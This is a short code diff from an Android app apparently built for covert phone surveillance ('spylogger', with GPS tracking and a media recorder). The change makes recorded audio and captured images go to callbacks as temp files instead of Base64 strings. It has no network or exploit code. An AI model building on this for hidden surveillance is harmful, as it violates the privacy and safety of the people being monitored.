@@ -5,10 +5,12 @@ import android.os.Handler;
 import android.os.Looper;
 
 import com.gravatasufoca.spylogger.services.GPSTracker;
-import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.LocalizacaoVO;
 
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.util.Date;
 
 /**
  * Created by bruno on 19/11/16.
@@ -54,7 +56,7 @@ public class ServicosHelper {
                 @Override
                 public void onFinish(Object object) {
                     if (object!=null && callback != null) {
-                        callback.onFinish(Utils.encodeBase64(mediaRecorderHelper.getRecordedFile()));
+                        callback.onFinish(mediaRecorderHelper.getRecordedFile());
                     }
                 }
             };
@@ -79,7 +81,7 @@ public class ServicosHelper {
                         @Override
                         public void onFinish(Object object) {
                             if (callback != null && object!=null) {
-                                callback.onFinish(Utils.encodeBase64(mediaRecorderHelper.getRecordedFile()));
+                                callback.onFinish(mediaRecorderHelper.getRecordedFile());
                             }
                         }
                     };
@@ -108,7 +110,19 @@ public class ServicosHelper {
                         public void onFinish(Object object) {
                             if(callback!=null && object!=null) {
                                 byte[] data = (byte[]) object;
-                                callback.onFinish(Utils.encodeBase64(data));
+                                FileOutputStream stream=null;
+                                try {
+                                    File tmp=File.createTempFile((new Date()).getTime()+"",".tmp");
+                                    stream=new FileOutputStream(tmp.getAbsolutePath());
+                                    stream.write(data);
+                                    callback.onFinish(tmp);
+                                } catch (IOException e) {
+                                }finally {
+                                    try {
+                                        stream.close();
+                                    } catch (IOException e) {
+                                    }
+                                }
                             }
                         }
                     };
